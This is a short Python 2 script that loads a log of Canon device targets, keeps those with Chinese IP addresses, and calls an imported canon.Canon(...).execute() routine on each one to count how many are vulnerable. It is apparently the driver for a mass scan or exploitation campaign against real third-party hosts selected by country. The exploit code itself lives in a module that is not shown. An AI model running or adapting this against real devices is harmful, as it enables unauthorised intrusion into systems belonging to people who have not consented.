import canon
import utils

targets = utils.load_log("../targets/Canon.log")
cn_spoor = [{"ip": t["ip"], "port": t["port"]} for t in targets if t["country"] == "China"]

vul = 0
for spoor in cn_spoor:
    instance = canon.Canon(spoor["ip"], spoor["port"])
    try:
        if instance.execute():
            vul += 1
    except Exception, e:
        utils.print_msg(e)
    del instance

utils.print_msg("Total:", len(cn_spoor), "Vulnerable:", vul)